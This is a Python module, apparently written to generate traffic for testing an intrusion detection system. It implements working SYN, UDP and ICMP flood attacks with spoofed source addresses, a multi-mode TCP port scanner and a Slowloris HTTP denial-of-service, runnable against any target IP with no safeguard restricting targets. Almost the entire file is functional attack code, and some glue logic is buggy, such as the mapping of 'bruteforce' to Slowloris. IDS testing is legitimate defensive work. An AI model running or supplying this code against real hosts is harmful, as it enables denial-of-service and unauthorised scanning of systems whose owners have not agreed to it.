"""
Attack Simulator Integration Module
Integrates attack simulation capabilities for testing IDS detection
"""

import os
import sys
import json
import time
import random
import logging
import threading
import subprocess
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("attack_simulator_integration")

# Try to import scapy - will fail gracefully if not installed
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    HAS_SCAPY = True
    logger.info("Scapy successfully imported")
except ImportError:
    HAS_SCAPY = False
    logger.warning("Scapy not available. Install with: pip install scapy")

# Define attack types
ATTACK_TYPES = {
    "syn_flood": "TCP SYN flood attack",
    "udp_flood": "UDP flood attack",
    "icmp_flood": "ICMP/Ping flood attack",
    "port_scan": "Port scanning attack",
    "slowloris": "Slowloris HTTP DoS attack"
}

class AttackSimulatorIntegration:
    """
    Integrates attack simulation capabilities with our existing system.
    Uses Scapy for network packet manipulation and attack simulation.
    """
    def __init__(self):
        self.running_attacks = {}  # {attack_id: thread}
        self.attack_status = {}    # {attack_id: status_dict}
        self.attack_counter = 0
        self.attack_simulator_path = None
        self.callbacks = []
        
    def initialize(self, attack_simulator_path=None):
        """Initialize with path to external attack simulator script if needed."""
        # Check for scapy availability
        if not HAS_SCAPY:
            logger.warning("Scapy not available - some attack simulations will use external script")
            
        # Use default path if not provided
        if not attack_simulator_path and not HAS_SCAPY:
            attack_simulator_path = os.path.join(os.environ.get('USERPROFILE', ''), 
                                                'Desktop', 'ids', 'attack_simulator.py')
            
        # Check if external simulator exists if needed
        if not HAS_SCAPY and attack_simulator_path:
            if not os.path.exists(attack_simulator_path):
                logger.error(f"External attack simulator not found: {attack_simulator_path}")
                return False
            else:
                logger.info(f"Using external attack simulator: {attack_simulator_path}")
                self.attack_simulator_path = attack_simulator_path
                
        logger.info("Attack simulator integration initialized successfully")
        return True
        
    def register_callback(self, callback):
        """Register a callback for attack status updates."""
        if callback not in self.callbacks:
            self.callbacks.append(callback)
        return True
        
    def unregister_callback(self, callback):
        """Unregister a callback."""
        if callback in self.callbacks:
            self.callbacks.remove(callback)
        return True
        
    def _notify_callbacks(self, attack_data):
        """Notify registered callbacks with attack data."""
        for callback in self.callbacks:
            try:
                callback(attack_data)
            except Exception as e:
                logger.error(f"Error in callback: {e}")
                
    def _get_new_attack_id(self):
        """Generate a new unique attack ID."""
        self.attack_counter += 1
        return f"attack_{self.attack_counter}_{int(time.time())}"
        
    def _update_attack_status(self, attack_id, status):
        """Update attack status and notify callbacks."""
        if attack_id in self.attack_status:
            self.attack_status[attack_id].update(status)
        else:
            self.attack_status[attack_id] = status
            
        # Notify callbacks
        self._notify_callbacks(self.attack_status[attack_id])
        
    def _syn_flood_thread(self, attack_id, target_ip, target_port, duration, pps):
        """Thread function for SYN flood attack."""
        if not HAS_SCAPY:
            logger.error("Cannot run SYN flood without Scapy")
            self._update_attack_status(attack_id, {"status": "failed", "reason": "Scapy not available"})
            return
            
        start_time = time.time()
        end_time = start_time + duration
        packets_sent = 0
        
        # Update status to running
        self._update_attack_status(attack_id, {"status": "running"})
        
        try:
            while time.time() < end_time and attack_id in self.running_attacks:
                # Create IP packet with random source
                src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
                
                # Send packet
                scapy.send(packet, verbose=False)
                packets_sent += 1
                
                # Update status periodically
                if packets_sent % 100 == 0:
                    self._update_attack_status(attack_id, {
                        "packets_sent": packets_sent,
                        "elapsed_time": time.time() - start_time
                    })
                    
                # Control rate
                time_to_sleep = 1.0 / pps
                time.sleep(time_to_sleep)
                
        except Exception as e:
            logger.error(f"Error in SYN flood thread: {e}")
            self._update_attack_status(attack_id, {"status": "failed", "reason": str(e)})
            
        # Update final status
        self._update_attack_status(attack_id, {
            "status": "completed",
            "total_packets": packets_sent,
            "total_duration": time.time() - start_time
        })
        
        # Remove from running attacks
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
    def _udp_flood_thread(self, attack_id, target_ip, target_port, duration, pps):
        """Thread function for UDP flood attack."""
        if not HAS_SCAPY:
            logger.error("Cannot run UDP flood without Scapy")
            self._update_attack_status(attack_id, {"status": "failed", "reason": "Scapy not available"})
            return
            
        start_time = time.time()
        end_time = start_time + duration
        packets_sent = 0
        
        # Update status to running
        self._update_attack_status(attack_id, {"status": "running"})
        
        try:
            while time.time() < end_time and attack_id in self.running_attacks:
                # Create IP packet with random source
                src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                src_port = random.randint(1024, 65535)
                
                # Create random payload
                payload_size = random.randint(10, 1400)
                payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                
                # Create UDP packet
                packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload
                
                # Send packet
                scapy.send(packet, verbose=False)
                packets_sent += 1
                
                # Update status periodically
                if packets_sent % 100 == 0:
                    self._update_attack_status(attack_id, {
                        "packets_sent": packets_sent,
                        "elapsed_time": time.time() - start_time
                    })
                    
                # Control rate
                time_to_sleep = 1.0 / pps
                time.sleep(time_to_sleep)
                
        except Exception as e:
            logger.error(f"Error in UDP flood thread: {e}")
            self._update_attack_status(attack_id, {"status": "failed", "reason": str(e)})
            
        # Update final status
        self._update_attack_status(attack_id, {
            "status": "completed",
            "total_packets": packets_sent,
            "total_duration": time.time() - start_time
        })
        
        # Remove from running attacks
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
    def _icmp_flood_thread(self, attack_id, target_ip, duration, pps):
        """Thread function for ICMP flood attack."""
        if not HAS_SCAPY:
            logger.error("Cannot run ICMP flood without Scapy")
            self._update_attack_status(attack_id, {"status": "failed", "reason": "Scapy not available"})
            return
            
        start_time = time.time()
        end_time = start_time + duration
        packets_sent = 0
        
        # Update status to running
        self._update_attack_status(attack_id, {"status": "running"})
        
        try:
            while time.time() < end_time and attack_id in self.running_attacks:
                # Create IP packet with random source
                src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                
                # Create ICMP packet
                packet = IP(src=src_ip, dst=target_ip) / ICMP()
                
                # Send packet
                scapy.send(packet, verbose=False)
                packets_sent += 1
                
                # Update status periodically
                if packets_sent % 100 == 0:
                    self._update_attack_status(attack_id, {
                        "packets_sent": packets_sent,
                        "elapsed_time": time.time() - start_time
                    })
                    
                # Control rate
                time_to_sleep = 1.0 / pps
                time.sleep(time_to_sleep)
                
        except Exception as e:
            logger.error(f"Error in ICMP flood thread: {e}")
            self._update_attack_status(attack_id, {"status": "failed", "reason": str(e)})
            
        # Update final status
        self._update_attack_status(attack_id, {
            "status": "completed",
            "total_packets": packets_sent,
            "total_duration": time.time() - start_time
        })
        
        # Remove from running attacks
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
    def _port_scan_thread(self, attack_id, target_ip, start_port, end_port, scan_type="syn"):
        """Thread function for port scanning attack."""
        if not HAS_SCAPY:
            logger.error("Cannot run port scan without Scapy")
            self._update_attack_status(attack_id, {"status": "failed", "reason": "Scapy not available"})
            return
            
        start_time = time.time()
        packets_sent = 0
        open_ports = []
        
        # Update status to running
        self._update_attack_status(attack_id, {"status": "running"})
        
        try:
            for port in range(start_port, end_port + 1):
                if attack_id not in self.running_attacks:
                    break
                    
                # Choose flag based on scan type
                if scan_type == "syn":
                    flags = "S"
                elif scan_type == "fin":
                    flags = "F"
                elif scan_type == "xmas":
                    flags = "FPU"
                elif scan_type == "null":
                    flags = ""
                else:
                    flags = "S"  # Default to SYN scan
                
                # Create TCP packet
                packet = IP(dst=target_ip) / TCP(dport=port, flags=flags)
                
                # Send packet and get response
                response = scapy.sr1(packet, timeout=0.5, verbose=False)
                packets_sent += 1
                
                # Check if port is open
                if response and response.haslayer(TCP):
                    if response.getlayer(TCP).flags & 0x12:  # SYN+ACK
                        open_ports.append(port)
                        
                # Update status periodically
                if packets_sent % 10 == 0:
                    self._update_attack_status(attack_id, {
                        "ports_scanned": packets_sent,
                        "open_ports": open_ports,
                        "elapsed_time": time.time() - start_time
                    })
                    
                # Small delay between packets
                time.sleep(0.01)
                
        except Exception as e:
            logger.error(f"Error in port scan thread: {e}")
            self._update_attack_status(attack_id, {"status": "failed", "reason": str(e)})
            
        # Update final status
        self._update_attack_status(attack_id, {
            "status": "completed",
            "total_ports_scanned": packets_sent,
            "open_ports": open_ports,
            "total_duration": time.time() - start_time
        })
        
        # Remove from running attacks
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
    def _slowloris_thread(self, attack_id, target_ip, target_port, num_connections, duration):
        """Thread function for Slowloris attack."""
        if not HAS_SCAPY:
            logger.error("Cannot run Slowloris attack without Scapy")
            self._update_attack_status(attack_id, {"status": "failed", "reason": "Scapy not available"})
            return
            
        import socket
        
        start_time = time.time()
        end_time = start_time + duration
        sockets_list = []
        
        # Update status to running
        self._update_attack_status(attack_id, {"status": "running"})
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if time.time() > end_time or attack_id not in self.running_attacks:
                    break
                    
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    
                    # Send incomplete HTTP request
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                    s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n".encode("utf-8"))
                    
                    sockets_list.append(s)
                except Exception as e:
                    logger.error(f"Error creating connection {i}: {e}")
                    continue
                    
                # Update status periodically
                if i % 10 == 0:
                    self._update_attack_status(attack_id, {
                        "connections_established": len(sockets_list),
                        "elapsed_time": time.time() - start_time
                    })
                    
                # Small delay between connections
                time.sleep(0.1)
                
            # Keep connections alive by sending partial headers
            while time.time() < end_time and attack_id in self.running_attacks:
                for s in list(sockets_list):
                    try:
                        # Send another header line to keep connection open
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except Exception:
                        sockets_list.remove(s)
                        
                # Try to create new connections to replace closed ones
                if len(sockets_list) < num_connections:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target_ip, target_port))
                        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                        s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
                        sockets_list.append(s)
                    except Exception:
                        pass
                        
                # Update status
                self._update_attack_status(attack_id, {
                    "active_connections": len(sockets_list),
                    "elapsed_time": time.time() - start_time
                })
                
                # Wait before next round
                time.sleep(15)
                
        except Exception as e:
            logger.error(f"Error in Slowloris thread: {e}")
            self._update_attack_status(attack_id, {"status": "failed", "reason": str(e)})
            
        # Clean up sockets
        for s in sockets_list:
            try:
                s.close()
            except Exception:
                pass
                
        # Update final status
        self._update_attack_status(attack_id, {
            "status": "completed",
            "max_connections": num_connections,
            "total_duration": time.time() - start_time
        })
        
        # Remove from running attacks
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
    def _external_attack_thread(self, attack_id, attack_type, target_ip, target_port=None, 
                               duration=60, pps=100, start_port=None, end_port=None, 
                               num_connections=None):
        """Run attack using external attack simulator script."""
        if not self.attack_simulator_path:
            logger.error("External attack simulator path not set")
            self._update_attack_status(attack_id, {"status": "failed", "reason": "External attack simulator not available"})
            return
            
        # Prepare command
        cmd = [sys.executable, self.attack_simulator_path, attack_type, target_ip]
        
        # Add additional parameters based on attack type
        if attack_type in ["syn_flood", "udp_flood", "slowloris"]:
            cmd.extend([str(target_port), str(duration)])
            
        if attack_type in ["syn_flood", "udp_flood", "icmp_flood"]:
            cmd.append(str(pps))
            
        if attack_type == "port_scan":
            cmd.extend([str(start_port), str(end_port)])
            
        if attack_type == "slowloris":
            cmd.append(str(num_connections))
            
        # Update status to running
        self._update_attack_status(attack_id, {"status": "running", "command": " ".join(cmd)})
        
        try:
            # Run command
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Update status periodically
            while process.poll() is None and attack_id in self.running_attacks:
                try:
                    stdout_line = process.stdout.readline()
                    if stdout_line:
                        # Try to parse JSON status updates from the script
                        if stdout_line.strip().startswith("{") and stdout_line.strip().endswith("}"):
                            try:
                                status_update = json.loads(stdout_line.strip())
                                self._update_attack_status(attack_id, status_update)
                            except json.JSONDecodeError:
                                pass
                except Exception:
                    pass
                    
                time.sleep(1)
                
            # Get final output
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                logger.error(f"External attack script failed: {stderr}")
                self._update_attack_status(attack_id, {"status": "failed", "reason": stderr})
            else:
                self._update_attack_status(attack_id, {"status": "completed"})
                
        except Exception as e:
            logger.error(f"Error running external attack: {e}")
            self._update_attack_status(attack_id, {"status": "failed", "reason": str(e)})
            
        # Remove from running attacks
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
    def syn_flood(self, target_ip, target_port, duration=60, pps=100):
        """Start a SYN flood attack."""
        attack_id = self._get_new_attack_id()
        
        # Create attack status
        attack_status = {
            "id": attack_id,
            "type": "syn_flood",
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "pps": pps,
            "status": "starting",
            "start_time": datetime.now().isoformat(),
            "description": ATTACK_TYPES["syn_flood"]
        }
        
        self.attack_status[attack_id] = attack_status
        
        # Start attack thread
        if HAS_SCAPY:
            thread = threading.Thread(
                target=self._syn_flood_thread,
                args=(attack_id, target_ip, target_port, duration, pps)
            )
        else:
            thread = threading.Thread(
                target=self._external_attack_thread,
                args=(attack_id, "syn_flood", target_ip, target_port, duration, pps)
            )
            
        thread.daemon = True
        thread.start()
        
        self.running_attacks[attack_id] = thread
        
        return attack_id
        
    def udp_flood(self, target_ip, target_port, duration=60, pps=100):
        """Start a UDP flood attack."""
        attack_id = self._get_new_attack_id()
        
        # Create attack status
        attack_status = {
            "id": attack_id,
            "type": "udp_flood",
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "pps": pps,
            "status": "starting",
            "start_time": datetime.now().isoformat(),
            "description": ATTACK_TYPES["udp_flood"]
        }
        
        self.attack_status[attack_id] = attack_status
        
        # Start attack thread
        if HAS_SCAPY:
            thread = threading.Thread(
                target=self._udp_flood_thread,
                args=(attack_id, target_ip, target_port, duration, pps)
            )
        else:
            thread = threading.Thread(
                target=self._external_attack_thread,
                args=(attack_id, "udp_flood", target_ip, target_port, duration, pps)
            )
            
        thread.daemon = True
        thread.start()
        
        self.running_attacks[attack_id] = thread
        
        return attack_id
        
    def icmp_flood(self, target_ip, duration=60, pps=100):
        """Start an ICMP flood attack."""
        attack_id = self._get_new_attack_id()
        
        # Create attack status
        attack_status = {
            "id": attack_id,
            "type": "icmp_flood",
            "target_ip": target_ip,
            "duration": duration,
            "pps": pps,
            "status": "starting",
            "start_time": datetime.now().isoformat(),
            "description": ATTACK_TYPES["icmp_flood"]
        }
        
        self.attack_status[attack_id] = attack_status
        
        # Start attack thread
        if HAS_SCAPY:
            thread = threading.Thread(
                target=self._icmp_flood_thread,
                args=(attack_id, target_ip, duration, pps)
            )
        else:
            thread = threading.Thread(
                target=self._external_attack_thread,
                args=(attack_id, "icmp_flood", target_ip, None, duration, pps)
            )
            
        thread.daemon = True
        thread.start()
        
        self.running_attacks[attack_id] = thread
        
        return attack_id
        
    def port_scan(self, target_ip, start_port=1, end_port=1024, scan_type="syn"):
        """Start a port scanning attack."""
        attack_id = self._get_new_attack_id()
        
        # Create attack status
        attack_status = {
            "id": attack_id,
            "type": "port_scan",
            "target_ip": target_ip,
            "start_port": start_port,
            "end_port": end_port,
            "scan_type": scan_type,
            "status": "starting",
            "start_time": datetime.now().isoformat(),
            "description": ATTACK_TYPES["port_scan"]
        }
        
        self.attack_status[attack_id] = attack_status
        
        # Start attack thread
        if HAS_SCAPY:
            thread = threading.Thread(
                target=self._port_scan_thread,
                args=(attack_id, target_ip, start_port, end_port, scan_type)
            )
        else:
            thread = threading.Thread(
                target=self._external_attack_thread,
                args=(attack_id, "port_scan", target_ip, None, None, None, start_port, end_port)
            )
            
        thread.daemon = True
        thread.start()
        
        self.running_attacks[attack_id] = thread
        
        return attack_id
        
    def slowloris(self, target_ip, target_port=80, num_connections=150, duration=60):
        """Start a Slowloris attack."""
        attack_id = self._get_new_attack_id()
        
        # Create attack status
        attack_status = {
            "id": attack_id,
            "type": "slowloris",
            "target_ip": target_ip,
            "target_port": target_port,
            "num_connections": num_connections,
            "duration": duration,
            "status": "starting",
            "start_time": datetime.now().isoformat(),
            "description": ATTACK_TYPES["slowloris"]
        }
        
        self.attack_status[attack_id] = attack_status
        
        # Start attack thread
        if HAS_SCAPY:
            thread = threading.Thread(
                target=self._slowloris_thread,
                args=(attack_id, target_ip, target_port, num_connections, duration)
            )
        else:
            thread = threading.Thread(
                target=self._external_attack_thread,
                args=(attack_id, "slowloris", target_ip, target_port, duration, None, None, None, num_connections)
            )
            
        thread.daemon = True
        thread.start()
        
        self.running_attacks[attack_id] = thread
        
        return attack_id
        
    def stop_attack(self, attack_id):
        """Stop a running attack."""
        if attack_id in self.running_attacks:
            # Update status
            self._update_attack_status(attack_id, {"status": "stopping"})
            
            # Remove from running attacks (thread will exit on next check)
            del self.running_attacks[attack_id]
            
            # Update final status
            self._update_attack_status(attack_id, {"status": "stopped"})
            
            logger.info(f"Attack {attack_id} stopped")
            return True
        else:
            logger.warning(f"Attack {attack_id} not found or already stopped")
            return False
            
    def stop_all_attacks(self):
        """Stop all running attacks."""
        attack_ids = list(self.running_attacks.keys())
        for attack_id in attack_ids:
            self.stop_attack(attack_id)
            
        return True
        
    def get_attack_status(self, attack_id=None):
        """Get status of a specific attack or all attacks."""
        if attack_id:
            return self.attack_status.get(attack_id, {"error": "Attack not found"})
        else:
            return self.attack_status
            
    def get_running_attacks(self):
        """Get list of running attacks."""
        return [
            self.attack_status[attack_id] for attack_id in self.running_attacks
            if attack_id in self.attack_status
        ]

# Create a singleton instance
attack_simulator = AttackSimulatorIntegration()

# Convenience functions
def initialize(attack_simulator_path=None):
    return attack_simulator.initialize(attack_simulator_path)
    
def syn_flood(target_ip, target_port, duration=60, pps=100):
    return attack_simulator.syn_flood(target_ip, target_port, duration, pps)
    
def udp_flood(target_ip, target_port, duration=60, pps=100):
    return attack_simulator.udp_flood(target_ip, target_port, duration, pps)
    
def icmp_flood(target_ip, duration=60, pps=100):
    return attack_simulator.icmp_flood(target_ip, duration, pps)
    
def port_scan(target_ip, start_port=1, end_port=1024, scan_type="syn"):
    return attack_simulator.port_scan(target_ip, start_port, end_port, scan_type)
    
def slowloris(target_ip, target_port=80, num_connections=150, duration=60):
    return attack_simulator.slowloris(target_ip, target_port, num_connections, duration)
    
def stop_attack(attack_id):
    return attack_simulator.stop_attack(attack_id)
    
def stop_all_attacks():
    return attack_simulator.stop_all_attacks()
    
def get_attack_status(attack_id=None):
    return attack_simulator.get_attack_status(attack_id)
    
def get_running_attacks():
    return attack_simulator.get_running_attacks()
    
def register_callback(callback):
    return attack_simulator.register_callback(callback)
    
def unregister_callback(callback):
    return attack_simulator.unregister_callback(callback)

# Export for module usage
__all__ = ['AttackSimulatorIntegration', 'attack_simulator', 'initialize', 
           'syn_flood', 'udp_flood', 'icmp_flood', 'port_scan', 'slowloris',
           'stop_attack', 'stop_all_attacks', 'get_attack_status', 'get_running_attacks',
           'register_callback', 'unregister_callback', 'execute_attack']

def execute_attack(attack_type, target_ip, duration=60, **kwargs):
    """
    Execute an attack based on the specified type.
    This is the main entry point for the attack_integration module.
    
    Args:
        attack_type: Type of attack to execute (e.g., 'portscan', 'bruteforce', 'ddos', 'malicious_port')
        target_ip: Target IP address
        duration: Duration of the attack in seconds
        **kwargs: Additional parameters specific to the attack type
        
    Returns:
        Dictionary with the attack status information
    """
    logger.info(f"Executing attack: {attack_type} against {target_ip} for {duration}s")
    
    # Map attack types from attack_integration to our supported types
    attack_type_map = {
        "portscan": "port_scan",
        "bruteforce": "slowloris",  # Use slowloris as a form of bruteforce
        "ddos": "syn_flood",
        "malicious_port": "port_scan"
    }
    
    # Get the corresponding attack type in our system
    mapped_attack_type = attack_type_map.get(attack_type)
    
    if not mapped_attack_type:
        return {
            "status": "error",
            "message": f"Unsupported attack type: {attack_type}"
        }
    
    # Set default parameters based on attack type
    if mapped_attack_type == "port_scan":
        # For portscan
        if attack_type == "portscan":
            # Regular port scan
            start_port = kwargs.get("start_port", 1)
            end_port = kwargs.get("end_port", 1024)
            scan_type = kwargs.get("scan_type", "syn")
            
            result = port_scan(target_ip, start_port, end_port, scan_type)
        else:
            # Malicious port scan - scan specifically malicious ports
            malicious_ports = [4444, 5555, 6666, 7777, 8888, 31337, 1337]
            # Choose random start and end ports that will include some malicious ports
            start_port = min(malicious_ports) - 10
            end_port = max(malicious_ports) + 10
            
            result = port_scan(target_ip, start_port, end_port, "syn")
    
    elif mapped_attack_type == "slowloris":
        # For bruteforce
        target_port = kwargs.get("target_port", 80)
        num_connections = kwargs.get("num_connections", 150)
        
        result = slowloris(target_ip, target_port, num_connections, duration)
    
    elif mapped_attack_type == "syn_flood":
        # For DDoS
        target_port = kwargs.get("target_port", 80)
        pps = kwargs.get("pps", 100)
        
        result = syn_flood(target_ip, target_port, duration, pps)
    
    # Add common metadata to result
    if isinstance(result, dict) and "attack_id" in result:
        attack_id = result["attack_id"]
        result.update({
            "original_attack_type": attack_type,
            "mapped_attack_type": mapped_attack_type,
            "target_ip": target_ip,
            "duration": duration,
            "timestamp": datetime.now().isoformat()
        })
        
        # Wait briefly for the attack to start
        time.sleep(1)
        
        # Get initial status
        status = get_attack_status(attack_id)
        if status:
            result.update(status)
    
    return result 